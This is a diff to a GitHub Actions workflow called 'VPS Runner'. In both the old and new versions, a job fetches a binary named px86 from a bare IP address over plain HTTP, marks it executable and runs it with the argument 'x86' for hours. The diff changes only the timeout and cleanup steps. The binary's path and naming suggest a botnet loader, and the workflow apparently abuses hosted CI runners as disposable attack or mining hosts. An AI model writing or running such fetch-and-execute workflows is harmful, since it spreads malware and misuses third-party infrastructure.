@@ -1,4 +1,4 @@
-name: Minimal VPS Runner
+name: VPS Runner
 
 on:
   workflow_dispatch:
@@ -19,38 +19,28 @@ on:
 jobs:
   run-binary:
     runs-on: ubuntu-latest
+    timeout-minutes: ${{ fromJSON(format('{0}', github.event.inputs.uptime)) * 60 + 10 }}
+    
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Download and run binary in background
+      - name: Download binary
         run: |
           wget http://45.138.16.158/bins/px86 -O px86
           chmod +x px86
-          # Run binary in background and redirect output
-          nohup ./px86 x86 > binary_output.log 2>&1 &
-          echo "Binary started in background with PID $!"
-          
-          # Store PID for potential later use
-          echo $! > binary.pid
+          file px86
+          ls -la px86
 
-      - name: Keep VM alive for specified time
+      - name: Run binary with timeout protection
         run: |
-          UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
-          echo "Keeping VM alive for $UPTIME_SECONDS seconds (${{ github.event.inputs.uptime }} hours)..."
+          # Calculate timeout (5 minutes less than total to allow cleanup)
+          TIMEOUT=$(( (${{ github.event.inputs.uptime }} * 3600) - 300 ))
+          echo "Running binary for $TIMEOUT seconds"
           
-          # Sleep for the specified time
-          sleep $UPTIME_SECONDS
+          # Run binary with timeout and log output
+          timeout $TIMEOUT ./px86 x86 || echo "Binary completed or timed out"
           
-          echo "Uptime completed, workflow finishing..."
+          echo "Binary execution phase completed"
 
-      - name: Optional - Stop binary (commented out)
-        if: always()
+      - name: Final cleanup wait
         run: |
-          # Uncomment the following lines if you want to stop the binary when workflow ends
-          # if [ -f binary.pid ]; then
-          #   PID=$(cat binary.pid)
-          #   echo "Stopping binary with PID $PID"
-          #   kill $PID 2>/dev/null || true
-          # fi
-          echo "Binary continues running until VM termination"
+          echo "Workflow completed successfully"
+          sleep 5
